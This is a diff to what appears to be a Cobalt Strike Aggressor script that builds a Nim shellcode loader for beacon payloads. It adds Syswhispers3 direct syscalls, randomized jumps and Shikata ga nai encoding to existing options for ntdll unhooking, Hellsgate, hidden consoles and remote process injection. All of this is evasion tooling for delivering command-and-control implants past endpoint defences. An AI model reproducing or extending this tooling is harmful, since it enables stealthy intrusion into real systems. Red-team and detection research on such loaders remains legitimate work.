@@ -18,7 +18,7 @@ sub compile {
         writeb($cradle, $data);
         closef($cradle);
 
-        @command = @(script_resource("NimSyscallLoader"), "--file", "beacon.bin");
+        @command = @(script_resource("NimSyscallLoader"), "--file", "beacon.bin", "--shellcode");
 
         if (%options["key"] ne "") {
                 push(@command, "--key", %options["key"])
@@ -46,6 +46,18 @@ sub compile {
 
         if (%options["hellsgate"] eq "true") {
                 push(@command, "--hellsgate")
+        }
+
+        if (%options["syswhispers"] eq "true") {
+                push(@command, "--syswhispers")
+        }
+
+        if (%options["jump"] eq "true") {
+                push(@command, "--jump")
+        }
+
+        if (%options["sgn"] eq "true") {
+                push(@command, "--sgn")
         }
 
         if (%options["hide"] eq "true") {
@@ -151,6 +163,9 @@ popup attacks {
                 drow_checkbox($dialog, "unhook", "Unhook: ", "Unhook ntdll.dll before doing anything else for the current process");
                 drow_checkbox($dialog, "reflective", "Reflective: ", "Set compiler flags, so that the Loader Nim binary can be reflectively loaded");
                 drow_checkbox($dialog, "hellsgate", "Hellsgate: ", "Retrieve Syscalls via Hellsgate technique");
+                drow_checkbox($dialog, "syswhispers", "Syswhispers3: ", "Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique");
+                drow_checkbox($dialog, "jump", "--- Jump: ", "When using Syswhispers3, use the jumper_randomized technique");
+                drow_checkbox($dialog, "sgn", "Shikata ga nai: ", "Encode shellcode via SGN before encrypting it");
                 drow_checkbox($dialog, "hide", "Hide: ", "Compile with --app:gui flag, so that the console won't pop up");
                 drow_combobox($dialog, "remoteinject", "Remote Injection: ", @(" -", "Newly spawned process (notepad)", "Existing process"));
                 drow_text($dialog, "remoteprocess", "--- Remote target process: ", "Injects into the specified remote process name");
